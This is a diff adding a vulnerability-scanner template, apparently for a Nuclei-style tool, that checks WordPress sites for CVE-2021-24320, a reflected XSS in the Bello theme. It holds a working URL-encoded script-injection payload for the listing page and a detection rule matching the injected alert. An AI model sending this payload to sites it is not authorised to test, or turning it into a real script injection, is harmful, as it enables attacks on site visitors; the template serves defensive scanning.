@@ -1,0 +1,27 @@
+id: CVE-2021-24320
+
+info:
+  name: Wordpress Bello < 1.6.0 - Unauthenticated Reflected XSS
+  risk: Medium
+  tech: WordPress,Bello
+
+params:
+  - root: '{{.BaseURL}}'
+
+variables:
+  - vuln: |
+      /listing/?listing_list_view=standard13%22%3C%2Fscript%3E%3Cscript%3Ealert%2812345%29%3C%2Fscript%3E
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}{{.vuln}}
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("response", "</script><script>alert(12345)</script>")
+
+references:
+  - https://wpscan.com/vulnerability/6b5b42fd-028a-4405-b027-3266058029bb
